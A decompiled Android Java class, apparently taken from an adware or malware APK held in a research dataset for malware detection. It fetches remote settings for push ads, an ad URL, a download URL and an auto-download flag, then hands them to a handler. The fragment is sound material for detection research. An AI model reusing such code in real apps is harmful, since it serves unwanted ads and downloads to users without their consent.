package com.unity3d.client;

import android.content.Context;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

/* JADX INFO: Access modifiers changed from: package-private */
/* loaded from: /mnt/c/Users/truon/OneDrive/Desktop/MyWorks/Research4IECgroup/Tasks/Graph-Attention-Networks/dataset/preprocessing/apk_tool/AMD_AndroZoo_demo/dex/cda1bec27e663b5b512c108d4427c257.apk/classes.dex */
public class d extends Thread {
    private final /* synthetic */ Context a;
    private final /* synthetic */ String b;

    /* JADX INFO: Access modifiers changed from: package-private */
    public d(Context context, String str) {
        this.a = context;
        this.b = str;
    }

    @Override // java.lang.Thread, java.lang.Runnable
    public void run() {
        String b;
        a aVar = new a();
        b = c.b(this.a, "G01", "Appkey:" + this.b);
        try {
            JSONArray jSONArray = new JSONArray(b);
            if (jSONArray.length() > 0) {
                JSONObject jSONObject = jSONArray.getJSONObject(0);
                aVar.a(jSONObject.getString("Fose"));
                aVar.b(jSONObject.getString("DelayTime"));
                aVar.c(jSONObject.getString("LinkTime"));
                aVar.d(jSONObject.getString("Autodown"));
                aVar.e(jSONObject.getString("Sound"));
                aVar.f(jSONObject.getString("pushtitle"));
                aVar.g(jSONObject.getString("Pushcontent"));
                aVar.h(jSONObject.getString("AdUrl"));
                aVar.i(jSONObject.getString("Adname"));
                aVar.j(jSONObject.getString("DownUrl"));
                aVar.k(jSONObject.getString("Pack"));
                if (aVar.b().equals("4")) {
                    try {
                        Thread.sleep(Integer.parseInt(aVar.a()) * 1000);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                }
                InfoManage.b.sendMessage(InfoManage.b.obtainMessage(71, aVar));
            }
        } catch (JSONException e2) {
        }
    }
}
